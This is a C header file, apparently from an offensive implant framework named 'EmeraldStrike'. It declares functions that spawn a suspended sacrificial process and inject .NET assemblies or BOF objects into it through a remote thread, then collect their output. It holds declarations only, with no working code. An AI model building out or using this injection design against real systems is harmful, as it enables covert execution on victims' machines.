#ifndef EMERALDSTRIKE_FORK_AND_RUN_H
#define EMERALDSTRIKE_FORK_AND_RUN_H

#include "common.h"

// Fork-and-run context: holds handles for the sacrificial process lifecycle
typedef struct _FORK_CTX {
    HANDLE  hProcess;
    HANDLE  hThread;       // main thread of sacrifice (created suspended)
    HANDLE  hPipeRead;     // parent's read end
    HANDLE  hPipeWrite;    // child's inherited write end (stdout/stderr)
    DWORD   dwPid;
} FORK_CTX;

// Spawn a sacrificial process (spawnto) in CREATE_SUSPENDED state with
// stdout/stderr redirected to an anonymous pipe. Returns FALSE on failure.
BOOL fork_spawn(PINSTANCE inst, FORK_CTX* ctx);

// Read all output from the pipe (blocks until child exits or timeout).
// Caller owns the returned buffer (es_free).
BOOL fork_collect_output(PINSTANCE inst, FORK_CTX* ctx,
                         BYTE** output, DWORD* output_len, DWORD timeout_ms);

// Terminate child and close all handles.
VOID fork_cleanup(PINSTANCE inst, FORK_CTX* ctx);

// ---- CLR bootstrap for execute_assembly fork-and-run ----

// Inject the CLR bootstrap stub + assembly data into the sacrifice,
// create a remote thread, wait for completion, and collect output.
// This is the high-level API called by cmd_execute_assembly.
BOOL fork_run_assembly(PINSTANCE inst,
                       BYTE* asm_data, DWORD asm_len,
                       const char* args_str, DWORD args_len,
                       BYTE** output, DWORD* output_len);

// ---- BOF bootstrap for inline_execute fork-and-run ----

// Inject the BOF bootstrap stub + COFF data + args into the sacrifice,
// create a remote thread, wait for completion, and collect output.
// This is the high-level API called by cmd_inline_execute.
BOOL fork_run_bof(PINSTANCE inst,
                  BYTE* bof_data, DWORD bof_len,
                  BYTE* bof_args, DWORD bof_args_len,
                  BYTE** output, DWORD* output_len);

#endif // EMERALDSTRIKE_FORK_AND_RUN_H
